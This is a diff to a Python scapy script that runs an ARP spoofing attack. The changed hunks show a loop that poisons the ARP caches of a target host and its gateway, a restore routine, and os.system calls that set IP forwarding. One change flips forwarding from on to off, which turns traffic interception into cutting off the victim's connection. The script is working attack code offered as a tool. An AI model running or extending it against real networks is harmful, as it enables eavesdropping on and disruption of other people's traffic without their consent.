@@ -3,9 +3,6 @@ import scapy.all as scapy
 import time
 import os
 
-# gateIp = ""
-# hostIp = "" 
-
 def get_mac(ip):
     mac = "xx"
     while mac == "xx":
@@ -39,7 +36,7 @@ def spoof(target_ip,spoof_ip):
 def start():
     count = 0 
     while True:
-        if flgs == 3:
+        if flg == 3:
             break
         spoof(hostIp,gateIp)
         spoof(gateIp,hostIp)
@@ -50,14 +47,16 @@ def start():
 def stop():
     restore(hostIp,gateIp)#restore(target ip , router ip )
 
-def spoint(gates,hosts,flg):  
-    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+def thpoint(gates,hosts,flgs):  
+    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
     global gateIp 
     gateIp = gates
     global hostIp 
     hostIp = hosts
-    global flgs
-    flgs = flg
+    global flg
+    flg = flgs
+    # print("1.start \n 2. restore")
+    # n = int(input("enter ur value : "))
     n = 1
     if n == 1 : 
         start()
